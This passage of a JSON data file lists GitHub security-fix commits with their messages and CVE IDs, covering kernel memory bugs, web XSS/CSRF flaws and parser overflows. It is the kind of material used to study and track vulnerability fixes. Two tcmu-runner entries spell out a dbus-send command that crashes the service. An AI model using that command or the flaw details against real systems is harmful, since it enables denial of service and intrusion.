  "af4cfb0492b1d6675bbfbae72a2b1a90b8b1a4f3513c4a7b25886b66d76f4fbe": {
    "url": "https://github.com/weidai11/cryptopp/commit/553049ba297d89d9e8fbf2204acb40a8a53f5cd6",
    "title": "Update README and INSTALL with -DNDEBUG requirement for production so…",
    "body": "…ftware (thanks FW)",
    "cveIds": [
      "CVE-2016-7420"
    ],
    "cveIdsCount": 1
  },
  "f65f34aa3795c8a2d4b8b4b573972ab04e57e58270e8e84ae07dd96a4cd4bb54": {
    "url": "https://github.com/torvalds/linux/commit/7bc2b55a5c030685b399bb65b6baa9ccc3d1f167",
    "title": "scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()",
    "body": "We need to put an upper bound on \"user_len\" so the memcpy() doesn'toverflow.Cc: <stable@vger.kernel.org>Reported-by: Marco Grassi <marco.gra@gmail.com>Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Reviewed-by: Tomas Henzl <thenzl@redhat.com>Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>",
    "cveIds": [
      "CVE-2016-7425"
    ],
    "cveIdsCount": 1
  },
  "326f005911872c33943f7f4330d2199f947cb290478050f77b12bd3322e633eb": {
    "url": "https://github.com/php/php-src/commit/61cdd1255d5b9c8453be71aacbbf682796ac77d4",
    "title": "Fix bug #73257 and bug #73258 - SplObjectStorage unserialize allows u…",
    "body": "…se of non-object as key",
    "cveIds": [
      "CVE-2016-7480"
    ],
    "cveIdsCount": 1
  },
  "b9f2b4629d3e0329fa02113fbf49a4dec0884f171dde497a6d9dd24f4da9d63b": {
    "url": "https://github.com/mdadams/jasper/commit/e24bdc716c3327b067c551bc6cfb97fd2370358d",
    "title": "Fixed a bug that resulted in the destruction of JP2 box data that had…",
    "body": "… neverbeen constructed in the first place.",
    "cveIds": [
      "CVE-2016-8887"
    ],
    "cveIdsCount": 1
  },
  "ca351344924ae29c8558e6acb5c11da2be2c2484d8ded7a0e615a15f1922a6dd": {
    "url": "https://github.com/exponentcms/exponent-cms/commit/fdafb5ec97838e4edbd685f587f28d3174ebb3db",
    "title": "iniitial effort to greatly enhance system security (xss, sql inject, …",
    "body": "…file exploit, rce, etc...)",
    "cveIds": [
      "CVE-2016-8897",
      "CVE-2016-9020",
      "CVE-2016-9087"
    ],
    "cveIdsCount": 3
  },
  "6405835fa285d7a5f8bdae586214ce0ecf747152d54414ef3f40fd3f37da4333": {
    "url": "https://github.com/exponentcms/exponent-cms/commit/a8efd9ca71fc9b8b843ad0910d435d237482ee31",
    "title": "second effort to greatly enhance system security (xss, sql inject, fi…",
    "body": "…le exploit, rce, etc...), thanks to felixk3y",
    "cveIds": [
      "CVE-2016-9021",
      "CVE-2016-9022",
      "CVE-2016-9023",
      "CVE-2016-9025",
      "CVE-2016-9026"
    ],
    "cveIdsCount": 5
  },
  "fc03f519a84ea67040d5ed6de1ee55281c343c5bef567569ca67c54b4e650df7": {
    "url": "https://github.com/torvalds/linux/commit/05692d7005a364add85c6e25a6c4447ce08f913a",
    "title": "vfio/pci: Fix integer overflows, bitmask check",
    "body": "The VFIO_DEVICE_SET_IRQS ioctl did not sufficiently sanitizeuser-supplied integers, potentially allowing memory corruption. Thispatch adds appropriate integer overflow checks, checks the range boundsfor VFIO_IRQ_SET_DATA_NONE, and also verifies that only single elementin the VFIO_IRQ_SET_DATA_TYPE_MASK bitmask is set.VFIO_IRQ_SET_ACTION_TYPE_MASK is already correctly checked later invfio_pci_set_irqs_ioctl().Furthermore, a kzalloc is changed to a kcalloc because the use of akzalloc with an integer multiplication allowed an integer overflowcondition to be reached without this patch. kcalloc checks for overflowand should prevent a similar occurrence.Signed-off-by: Vlad Tsyrklevich <vlad@tsyrklevich.net>Signed-off-by: Alex Williamson <alex.williamson@redhat.com>",
    "cveIds": [
      "CVE-2016-9083",
      "CVE-2016-9084"
    ],
    "cveIdsCount": 2
  },
  "95dc2f5c554f79d29a53ecb6c71e89874de04f11f11e99899132bc2a9da78051": {
    "url": "https://github.com/torvalds/linux/commit/9590232bb4f4cc824f3425a6e1349afbe6d6d2b7",
    "title": "staging/android/ion : fix a race condition in the ion driver",
    "body": "There is a use-after-free problem in the ion driver.This is caused by a race condition in the ion_ioctl()function.A handle has ref count of 1 and two tasks on differentcpus calls ION_IOC_FREE simultaneously.cpu 0 cpu 1-------------------------------------------------------ion_handle_get_by_id()(ref == 2) ion_handle_get_by_id() (ref == 3)ion_free()(ref == 2)ion_handle_put()(ref == 1) ion_free() (ref == 0 so ion_handle_destroy() is called and the handle is freed.) ion_handle_put() is called and it decreases the slub's next free pointerThe problem is detected as an unaligned access in thespin lock functions since it uses load exclusive instruction. In some cases it corrupts the slub'sfree pointer which causes a mis-aligned access to thenext free pointer.(kmalloc returns a pointer likeffffc0745b4580aa). And it causes lots of otherhard-to-debug problems.This symptom is caused since the first member in theion_handle structure is the reference count and theion driver decrements the reference after it has beenfreed.To fix this problem client->lock mutex is extendedto protect all the codes that uses the handle.Signed-off-by: Eun Taik Lee <eun.taik.lee@samsung.com>Reviewed-by: Laura Abbott <labbott@redhat.com>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2016-9120"
    ],
    "cveIdsCount": 1
  },
  "7684ee91e8614137ed688fdecd10df90c44ddb10b8a774821af896f1a8fa054d": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/847941390f5b3310d51b07c92ec91cc1f4cc82c9",
    "title": "Mitigate h1 report 96115",
    "body": "Improper Restriction of Excessive Authentication Attempts---------------------------------------------------------Karan M. Tank and Smit B. Shah have reported via HackerOne that the loginpage of Revive Adserver was vulnerable to password-guessing attacks. Anaccount lockdown feature was taken into account, but rejected to avoidintroducing service disruptions to regular users during such attacks.A random delay has been introduced as a counter-measure in case of passwordfailures, along with a system to discourage parallel brute forcing. Suchsystem will effectively allow the actual user to log in to the adserver evenwhile an attack is in progress.A CVE-ID has been requested, but not assigned yet.CWE: CWE-307CVSSv2: 8.5 (AV:N/AC:L/Au:N/C:C/I:P/A:N)",
    "cveIds": [
      "CVE-2016-9124"
    ],
    "cveIdsCount": 1
  },
  "022e9a379dceb8588eb616fd9cb160e3717b58772ee44cfab805f5c41e787aa1": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/8d8c6df309ff5fde9dd4770abcd4ec5d2449b3ec",
    "title": "Fix h1 report 97073",
    "body": "Persistent XSS--------------Tengku Zahasman has reported via HackerOne that usernames were not properlyescaped when displayed in the audit trail widget of the dashboard upon login,allowing persistent XSS attacks. An authenticated user with enough privilegesto create other users could exploit the vulnerability to access theadministrator account.A CVE-ID has been requested, but not assigned yet.CWE: CWE-79CVSSv2: 5.6 (AV:N/AC:H/Au:S/C:C/I:P/A:N)",
    "cveIds": [
      "CVE-2016-9126"
    ],
    "cveIdsCount": 1
  },
  "a428c0e7b7ff10ddeb9d6f9ee23d8d9d8c7fff8c5a8a41d474da14dd44083f94": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/3aaebcc765797d2c684e031f2836e0a69d6b7bc2",
    "title": "Fix h1 report 99452",
    "body": "Cross-Site Request Forgery (CSRF)---------------------------------An undisclosed user has reported via HackerOne that the password recovery formin Revive Adserver was vulnerable to CSRF attacks. Such vulnerability could beexploited to send a large number of password recovery emails to theregistered users, especially in conjunction with a bug that caused recoveryemails to be sent to all the users at once. Both issues have been fixed.A CVE-ID has been requested, but not assigned yet.CWE: CWE-352CVSSv2: 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)",
    "cveIds": [
      "CVE-2016-9127"
    ],
    "cveIdsCount": 1
  },
  "6f5e5c91a63de101414a45a52c8a5afd41147f6d99c45b51b36a921411293be0": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/a323fd626627e8d42819fd5b7e2829196b5c54a3",
    "title": "Fix h1 report 99004",
    "body": "Reflected XSS-------------The HackerOne user @decidedlygray has reported that the affiliate-preview.phpscript in www/admin is vulnerable to a reflected XSS attack via the \"charset\"parameter. If the target system is running a Revive Adserver version olderthan 3.2.2, such a vulnerability could be used by an attacker to steal thesession ID of an authenticated user, by tricking them into visiting aspecifically crafted URL.A CVE-ID has been requested, but not assigned yet.CWE: CWE-79CVSSv2: 3.5 (AV:N/AC:M/Au:S/C:N/I:P/A:N)",
    "cveIds": [
      "CVE-2016-9128"
    ],
    "cveIdsCount": 1
  },
  "81d931275ca21417e25cfb9fd101e194b346901c57ca7b6cab69d7916b71bbe3": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/38223a841190bebd7a137c7bed84fbbcb2b0c2a5",
    "title": "Fix h1 report 98612",
    "body": "Information Exposure Through Discrepancy----------------------------------------Karan M. Tank and Smit B. Shah have reported via HackerOne that it waspossible to check whether or not an email address was associated to one ormore user accounts on a target Revive Adserver instance by examining themessage printed by the password recovery system. Such information cannothowever be used directly to log in to the system, which requires usernamesinstead.A CVE-ID has been requested, but not assigned yet.CWE: CWE-203CVSSv2: 5 (AV:N/AC:L/Au:N/C:P/I:N/A:N)",
    "cveIds": [
      "CVE-2016-9129"
    ],
    "cveIdsCount": 1
  },
  "81246b99aca42d3c92da3dc31bbd49bc29784d0624e749c6080b6bb22224cbe7": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/f6880330a8e11e804663f132867e9eb9b1f94e83",
    "title": "Fix h1 reports 107550 and 107634",
    "body": "Persistent XSS--------------Johan Caluwe has reported via HackerOne two vectors for persistent XSSRevive Adserver user interface, both requiring a trusted (non-admin) account:1. the website name wasn't properly escaped when displayed in the campaign-zone.php script;2. the banner image url for external banners wasn't properly escaped when displayed in most of the banner related pages.A CVE-ID has been requested, but not assigned yet.CWE: CWE-79CVSSv2: 3.5 (AV:N/AC:M/Au:S/C:N/I:P/A:N)",
    "cveIds": [
      "CVE-2016-9130"
    ],
    "cveIdsCount": 1
  },
  "8e29510ec69a1502e1c30e10f3d19458b9546fe589eb237f80b589e28ca0a3c7": {
    "url": "https://github.com/exponentcms/exponent-cms/commit/45a7a62797e64e8abbae35d4859097c26f1874b1",
    "title": "regression fix last vulnerability fix for sanitizing order/direction …",
    "body": "…params",
    "cveIds": [
      "CVE-2016-9134"
    ],
    "cveIdsCount": 1
  },
  "2b5f1937a5322a15de796a10f6de1df9aebc44a12289c5689376bb0919011318": {
    "url": "https://github.com/torvalds/linux/commit/1c109fabbd51863475cd12ac206bdd249aee35af",
    "title": "fix minor infoleak in get_user_ex()",
    "body": "get_user_ex(x, ptr) should zero x on failure. It's not a lot of a leak(at most we are leaking uninitialized 64bit value off the kernel stack,and in a fairly constrained situation, at that), but the fix is trivial,so...Cc: stable@vger.kernel.orgSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>[ This sat in different branch from the uaccess fixes since mid-August ]Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2016-9178"
    ],
    "cveIdsCount": 1
  },
  "fedacf46fda13b4447cce9b165073435feb71448455b60f00ead2280e03c7147": {
    "url": "https://github.com/exponentcms/exponent-cms/commit/3b3557e9f6ba193a4c23c8ce5498fa285dddf3f3",
    "title": "fix security vulnerability in order search and editor preview; report…",
    "body": "…ed by fyth",
    "cveIds": [
      "CVE-2016-9183"
    ],
    "cveIdsCount": 1
  },
  "0882f351324b064abad179f4778efa01ba7c3f12897224e135615f67e9692a45": {
    "url": "https://github.com/torvalds/linux/commit/93362fa47fe98b62e4a34ab408c4a418432e7939",
    "title": "sysctl: Drop reference added by grab_header in proc_sys_readdir",
    "body": "Fixes CVE-2016-9191, proc_sys_readdir doesn't drop referenceadded by grab_header when return from !dir_emit_dots path.It can cause any path called unregister_sysctl_table willwait forever.The calltrace of CVE-2016-9191:[ 5535.960522] Call Trace:[ 5535.963265] [<ffffffff817cdaaf>] schedule+0x3f/0xa0[ 5535.968817] [<ffffffff817d33fb>] schedule_timeout+0x3db/0x6f0[ 5535.975346] [<ffffffff817cf055>] ? wait_for_completion+0x45/0x130[ 5535.982256] [<ffffffff817cf0d3>] wait_for_completion+0xc3/0x130[ 5535.988972] [<ffffffff810d1fd0>] ? wake_up_q+0x80/0x80[ 5535.994804] [<ffffffff8130de64>] drop_sysctl_table+0xc4/0xe0[ 5536.001227] [<ffffffff8130de17>] drop_sysctl_table+0x77/0xe0[ 5536.007648] [<ffffffff8130decd>] unregister_sysctl_table+0x4d/0xa0[ 5536.014654] [<ffffffff8130deff>] unregister_sysctl_table+0x7f/0xa0[ 5536.021657] [<ffffffff810f57f5>] unregister_sched_domain_sysctl+0x15/0x40[ 5536.029344] [<ffffffff810d7704>] partition_sched_domains+0x44/0x450[ 5536.036447] [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111/0x1f0[ 5536.043844] [<ffffffff81167684>] rebuild_sched_domains_locked+0x64/0xb0[ 5536.051336] [<ffffffff8116789d>] update_flag+0x11d/0x210[ 5536.057373] [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450[ 5536.064186] [<ffffffff81167acb>] ? cpuset_css_offline+0x1b/0x60[ 5536.070899] [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd/0x10[ 5536.077420] [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450[ 5536.084234] [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25/0x220[ 5536.091049] [<ffffffff81167ae5>] cpuset_css_offline+0x35/0x60[ 5536.097571] [<ffffffff8115aa2c>] css_killed_work_fn+0x5c/0x220[ 5536.104207] [<ffffffff810bc83f>] process_one_work+0x1df/0x710[ 5536.110736] [<ffffffff810bc7c0>] ? process_one_work+0x160/0x710[ 5536.117461] [<ffffffff810bce9b>] worker_thread+0x12b/0x4a0[ 5536.123697] [<ffffffff810bcd70>] ? process_one_work+0x710/0x710[ 5536.130426] [<ffffffff810c3f7e>] kthread+0xfe/0x120[ 5536.135991] [<ffffffff817d4baf>] ret_from_fork+0x1f/0x40[ 5536.142041] [<ffffffff810c3e80>] ? kthread_create_on_node+0x230/0x230One cgroup maintainer mentioned that \"cgroup is trying to offlinea cpuset css, which takes place under cgroup_mutex. The offliningends up trying to drain active usages of a sysctl table which apprentlyis not happening.\"The real reason is that proc_sys_readdir doesn't drop reference addedby grab_header when return from !dir_emit_dots path. So this cpusetoffline path will wait here forever.See here for details: http://www.openwall.com/lists/oss-security/2016/11/04/13Fixes: f0c3b50 (\"[readdir] convert procfs\")Cc: stable@vger.kernel.orgReported-by: CAI Qian <caiqian@redhat.com>Tested-by: Yang Shukui <yangshukui@huawei.com>Signed-off-by: Zhou Chengming <zhouchengming1@huawei.com>Acked-by: Al Viro <viro@ZenIV.linux.org.uk>Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2016-9191"
    ],
    "cveIdsCount": 1
  },
  "0e4e007979cb374d46b924582c593974ea10e3aa2d8f7e36fbab24b3bd4b3b3b": {
    "url": "https://github.com/zulip/zulip/commit/960d736e55cbb9386a68e4ee45f80581fd2a4e32",
    "title": "registration: Require an explicit realm on PreregistrationUser.",
    "body": "This completes the last commit's work to fix CVE-2017-0910, applyingto any invite links already created before the fix was deployed. Withthis change, all new-user registrations must match an explicit realmin the PreregistrationUser row, except when creating a new realm.[greg: rewrote commit message]",
    "cveIds": [
      "CVE-2017-0910"
    ],
    "cveIdsCount": 1
  },
  "94252469634ff64547addbe9c8fc94c116e9dedba7b3ce2671d67e02d2b3610c": {
    "url": "https://github.com/xenocrat/chyrp-lite/commit/79bb2de7f57d163d256b6bdb127dc09cfdb6235a",
    "title": "MainController, Blog Themes: protect against CSRF",
    "body": "My thanks to @fleetcaptain for the report.",
    "cveIds": [
      "CVE-2017-1000008"
    ],
    "cveIdsCount": 1
  },
  "76fa0d2b11988202b594399080bb63148049c4ebaf948c67a98eaaf83c32f6d5": {
    "url": "https://github.com/open-iscsi/tcmu-runner/commit/61bd03e600d2abf309173e9186f4d465bb1b7157",
    "title": "glfs: discard glfs_check_config",
    "body": "Signed-off-by: Prasanna Kumar Kalever <prasanna.kalever@redhat.com>",
    "cveIds": [
      "CVE-2017-1000198"
    ],
    "cveIdsCount": 1
  },
  "a39ef90f714ae601434dc2863e12590c135d20fc41b6b920bdf6fe98b8d975fb": {
    "url": "https://github.com/open-iscsi/tcmu-runner/pull/200/commits/bb80e9c7a798f035768260ebdadffb6eb0786178",
    "title": "only allow dynamic UnregisterHandler for external handlers, thereby f…",
    "body": "…ixing DoSTrying to unregister an internal handler ended up in a SEGFAULT, becausethe tcmur_handler->opaque was NULL. Way to reproduce:dbus-send --system --print-reply --dest=org.kernel.TCMUService1 /org/kernel/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.UnregisterHandler string:qcowwe use a newly introduced boolean in struct tcmur_handler for keepingtrack of external handlers. As suggested by mikechristie adjusting thepublic data structure is acceptable.",
    "cveIds": [
      "CVE-2017-1000200"
    ],
    "cveIdsCount": 1
  },
  "46ee76da9997f09e40d86d10378201a4922dde4d93f522e6f22f346726a1aa7a": {
    "url": "https://github.com/open-iscsi/tcmu-runner/pull/200/commits/e2d953050766ac538615a811c64b34358614edce",
    "title": "fixed local DoS when UnregisterHandler was called for a not existing …",
    "body": "…handlerAny user with DBUS access could cause a SEGFAULT in tcmu-runner byrunning something like this:dbus-send --system --print-reply --dest=org.kernel.TCMUService1 /org/kernel/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.UnregisterHandler string:123",
    "cveIds": [
      "CVE-2017-1000201"
    ],
    "cveIdsCount": 1
  },
  "3b2777e8af6a8ef0a564b86b6019c4d1c5ec0a0d86b1e5018f8371ca60dca52f": {
    "url": "https://github.com/root-project/root/commit/88ccff152604e0f1012653a596d802ff7ede3145#diff-6cd6f6c31bac70116b7ca7abdc8e517e",
    "title": "rootd: do not use popen() to expand path names (#513)",
    "body": "Addressed security threat reported by S. Luders.Using the same technology used in TSystem::ExpandFileName (with clang-format processing).",
    "cveIds": [
      "CVE-2017-1000203"
    ],
    "cveIdsCount": 1
  },
  "27445b9cd80fbea0c1d2664b2ba0141f09cb61a9379b4cf1af81343540a1e3c2": {
    "url": "https://github.com/WBCE/WBCE_CMS/commit/0da620016aec17ac2d2f3a22c55ab8c2b55e691e#diff-7b380285e285160d0070863099baabe0",
    "title": "Update user search",
    "body": "Update user search from 0.41 to 0.50",
    "cveIds": [
      "CVE-2017-1000213"
    ],
    "cveIdsCount": 1
  },
  "c0845b771f3cacc07b77628e256c8d1107cbf96e957d6fd04f0c6d2abf091a36": {
    "url": "https://github.com/Enalean/gitphp/commit/160621785ee812d6d90e20878bd6175e42c13c94",
    "title": "Fix shell injections",
    "body": "No dynamic parameters should be passed shell_exec() withoutbeing properly escaped",
    "cveIds": [
      "CVE-2017-1000214"
    ],
    "cveIdsCount": 1
  },
  "2ca548b54ad71908effb0c5b5c5a58b209eb3d3782a993ec13d9b03a9752c172": {
    "url": "https://github.com/xrootd/xrootd/commit/befa2e627a5a33a38c92db3e57c07d8246a24acf",
    "title": "secgsi: do not build/package libXrdSecgsiGMAPLDAP-4.so",
    "body": "The way the LDAP query is implemented may represent a security threat.Any related building and packaging reference is removed.The code is left in place (for the time being) to remind its functionalityin the case a sanitized version is required.",
    "cveIds": [
      "CVE-2017-1000215"
    ],
    "cveIdsCount": 1
  },
  "20d39051f67091a2061addb0c923900ab8bce26089013a175957fccde3745b0c": {
    "url": "https://github.com/haml/haml/commit/18576ae6e9bdcb4303fdbe6b3199869d289d67c2",
    "title": "Always escape ' in Haml::Helpers.#html_escape.",
    "body": "In some tests, `attr_wrapper` is changed to be ignored.I'll split its fix to other commis because not Haml::Helpers butHaml::AttributeBuilder is responsible for that.",
    "cveIds": [
      "CVE-2017-1002201"
    ],
    "cveIdsCount": 1
  },
  "12007e7c94d70c7ef71d0e3b6a720b27bacd17d25b0fdbe421e833d8e8fd6647": {
    "url": "https://github.com/torvalds/linux/commit/1e38da300e1e395a15048b0af1e5305bd91402f6",
    "title": "timerfd: Protect the might cancel mechanism proper",
    "body": "The handling of the might_cancel queueing is not properly protected, soparallel operations on the file descriptor can race with each other andlead to list corruptions or use after free.Protect the context for these operations with a seperate lock.The wait queue lock cannot be reused for this because that would create alock inversion scenario vs. the cancel lock. Replacing might_cancel with anatomic (atomic_t or atomic bit) does not help either because it still canrace vs. the actual list operation.Reported-by: Dmitry Vyukov <dvyukov@google.com>Signed-off-by: Thomas Gleixner <tglx@linutronix.de>Cc: \"linux-fsdevel@vger.kernel.org\"Cc: syzkaller <syzkaller@googlegroups.com>Cc: Al Viro <viro@zeniv.linux.org.uk>Cc: linux-fsdevel@vger.kernel.orgLink: http://lkml.kernel.org/r/alpine.DEB.2.20.1701311521430.3457@nanosSigned-off-by: Thomas Gleixner <tglx@linutronix.de>",
    "cveIds": [
      "CVE-2017-10661"
    ],
    "cveIdsCount": 1
  },
  "032e6dfbab471e9b6d94b6d4988ce1930d66b977398102a75da62163c9cff7ce": {
    "url": "https://github.com/blueness/sthttpd/releases/tag/v2.27.1",
    "title": "",
    "body": "Merge pull request #4 from alpire/mastersrc/libhttpd.c: fix heap buffer overflow in de_dotdot",
    "cveIds": [
      "CVE-2017-10671"
    ],
    "cveIdsCount": 1
  },
  "b3d1312a907f1e700ff51ceb4b789f7d98f257014049d609187008a55701cc81": {
    "url": "https://github.com/Piwigo/Piwigo/commit/03a8329b89c0d196ecdb54227a8113f24555ffc0",
    "title": "adding pwg_token on permalink & cat_options",
    "body": "and therefor solving issue:721",
    "cveIds": [
      "CVE-2017-10678",
      "CVE-2017-10680",
      "CVE-2017-10681"
    ],
    "cveIdsCount": 3
  },
  "58aaf6bc8cc9e9d9f0e3c0759aa11bd7e3d908e2b4747a0bb6712c11fe49a790": {
    "url": "https://github.com/Piwigo/Piwigo/commit/3dd6812412289a199564e63fffd0a9754010b9e0",
    "title": "check input parameter for cat_options pages",
    "body": "solving #724",
    "cveIds": [
      "CVE-2017-10682"
    ],
    "cveIdsCount": 1
  },
  "3c562411a657884a5b2f813ee048df1d571288b9906134bf90cb07d3f8bc77b1": {
    "url": "https://github.com/torvalds/linux/commit/089bc0143f489bd3a4578bdff5f4ca68fb26f341",
    "title": "xen-blkback: don't leak stack data via response ring",
    "body": "Rather than constructing a local structure instance on the stack, fillthe fields directly on the shared ring, just like other backends do.Build on the fact that all response structure flavors are actuallyidentical (the old code did make this assumption too).This is XSA-216.Cc: stable@vger.kernel.orgSigned-off-by: Jan Beulich <jbeulich@suse.com>Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>",
    "cveIds": [
      "CVE-2017-10911"
    ],
    "cveIdsCount": 1
  },
  "b86d7b01b361327d55308b2240365d685785020d207e5099e9f34183de6c8a57": {
    "url": "https://github.com/irssi/irssi/commit/5e26325317c72a04c1610ad952974e206384d291",
    "title": "Merge branch 'security' into 'master'",
    "body": "SecurityCloses #10See merge request !17",
    "cveIds": [
      "CVE-2017-10965",
      "CVE-2017-10966"
    ],
    "cveIdsCount": 2
  },
  "b3519b24cf8dab54b3922de346263fb0a319026d456f3b8d2bcfa490f4df2d02": {
    "url": "https://github.com/torvalds/linux/commit/f991af3daabaecff34684fd51fac80319d1baad1",
    "title": "mqueue: fix a use-after-free in sys_mq_notify()",
    "body": "The retry logic for netlink_attachskb() inside sys_mq_notify()is nasty and vulnerable:1) The sock refcnt is already released when retry is needed2) The fd is controllable by user-space because we already release the file refcntso we when retry but the fd has been just closed by user-spaceduring this small window, we end up calling netlink_detachskb()on the error path which releases the sock again, later whenthe user-space closes this socket a use-after-free could betriggered.Setting 'sock' to NULL here should be sufficient to fix it.Reported-by: GeneBlue <geneblue.mail@gmail.com>Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Manfred Spraul <manfred@colorfullife.com>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-11176"
    ],
    "cveIdsCount": 1
  },
  "5711dc09c08cbd8cdad79aef5ee16fabd6a5bbe1022d531148d989288b0fcc1d": {
    "url": "https://github.com/VirusTotal/yara/commit/4a342f01e5439b9bb901aff1c6c23c536baeeb3f",
    "title": "Fix heap overflow (reported by Jurriaan Bremer)",
    "body": "When setting a new array item with yr_object_array_set_item() the array size is doubled if the index for the new item is larger than the already allocated ones. No further checks were made to ensure that the index fits into the array after doubling its capacity. If the array capacity was for example 64, and a new object is assigned to an index larger than 128 the overflow occurs. As yr_object_array_set_item() is usually invoked with indexes that increase monotonically by one, this bug never triggered before. But the new \"dotnet\" module has the potential to allow the exploitation of this bug by scanning a specially crafted .NET binary.",
    "cveIds": [
      "CVE-2017-11328"
    ],
    "cveIdsCount": 1
  },
  "af66261ca8301756b1676345bfc310c76bdd45253333bb4e5b0b5556a929ccef": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/ba4beaf6149f7241c8bd85fe853318c2f6837ad0",
    "title": "avcodec/apedec: Fix integer overflow",
    "body": "Fixes: out of array accessFixes: PoC.ape and othersFound-by: Bingchang, Liu@VARAS of IIESigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-11399"
    ],
    "cveIdsCount": 1
  },
  "75705aa3fdfc629758be1d79aad103d0e0b0c7af815823eec25b53c9cb5be86e": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/96349da5ec8eda9f0368446e557fe0c8ba0e66b7",
    "title": "avcodec/apedec: Fix integer overflow",
    "body": "Fixes: out of array accessFixes: PoC.ape and othersFound-by: Bingchang, Liu@VARAS of IIESigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit ba4beaf)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-11399"
    ],
    "cveIdsCount": 1
  },
  "de23c2090369c622b96c8abb1a907d996fa05ec610c9350c51eac8bc401d265a": {
    "url": "https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5",
    "title": "Switch to msitools' msiinfo for ProductVersion fetching",
    "body": "This replaces the insecure VBScript-based parsing, which has issues described at http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html",
    "cveIds": [
      "CVE-2017-11421"
    ],
    "cveIdsCount": 1
  },
  "590d6359d9567318115f3fc63aaffad7f65fddc5f413b8bc20e9b8fdfa6cef71": {
    "url": "https://github.com/loomio/loomio/commit/63973f71e337ead8ca7b7ae2a043b837032dc3fe",
    "title": "Ensure existing marked renderer code runs with customization (#4078)",
    "body": "* Ensure existing marked renderer code runs with customization* Use noopener / noreferrer for marked links",
    "cveIds": [
      "CVE-2017-11594"
    ],
    "cveIdsCount": 1
  },
  "bd6684e147238c3c5bb395e7ffcad4c9f628a17b8dceb59d23d20a010ca51035": {
    "url": "https://github.com/Mindwerks/wildmidi/commit/ad6d7cf88d6673167ca1f517248af9409a9f1be1",
    "title": "Fix bug #175:",
    "body": "CVE-2017-11661, CVE-2017-11662, CVE-2017-11663, CVE-2017-11664:Add a new size parameter to _WM_SetupMidiEvent() so that itknows where to stop reading, and adjust its clients properly.",
    "cveIds": [
      "CVE-2017-11664"
    ],
    "cveIdsCount": 1
  },
  "88e403407a7b78eb983c737a4d7a27b085c745174fbd974f812c6f1f42ed64cd": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/ffcc82219cef0928bed2d558b19ef6ea35634130",
    "title": "avformat/rtmppkt: Convert ff_amf_get_field_value() to bytestream2",
    "body": "Fixes: out of array accessesFound-by: JunDong Xie of Ant-financial Light-Year Security LabSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-11665"
    ],
    "cveIdsCount": 1
  },
  "42a85511041e0b923b9cf7e88888963c869cf2ad6c7e63ade6a0c8beb50e708d": {
    "url": "https://github.com/Cacti/cacti/commit/104090aeead4aa433bf1f18cd6d52dcfeb71236c",
    "title": "Resolving Issue #867",
    "body": "Cross-site scripting (XSS) vulnerability in auth_profile.php",
    "cveIds": [
      "CVE-2017-11691"
    ],
    "cveIdsCount": 1
  },
  "bf9f47655bf93bc9106fc099d07f816e995a45360ebc4c48ad09042d3fb57be8": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/296debd213bd6dce7647cedd34eb64e5b94cdc92",
    "title": "avcodec/dnxhddec: Move mb height check out of non hr branch",
    "body": "Fixes: out of array accessFixes: poc.dnxhdFound-by: Bingchang, Liu@VARAS of IIESigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-11719"
    ],
    "cveIdsCount": 1
  },
  "0e39e957b9e735d96498a98abb7f7a8ba51b78bbb3f1b5535878e6dbd747a119": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/f31fc4755f69ab26bf6e8be47875b7dcede8e29e",
    "title": "avcodec/dnxhddec: Move mb height check out of non hr branch",
    "body": "Fixes: out of array accessFixes: poc.dnxhdFound-by: Bingchang, Liu@VARAS of IIESigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 296debd)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-11719"
    ],
    "cveIdsCount": 1
  },
  "85dc220272ff56ce5fe085f640256204a7ee78190cc0ea7cd96c1cef5e86294e": {
    "url": "https://github.com/ioquake/ioq3/commit/d2b1d124d4055c2fcbe5126863487c52fd58cca1",
    "title": "Fix/improve buffer overflow in MSG_ReadBits/MSG_WriteBits",
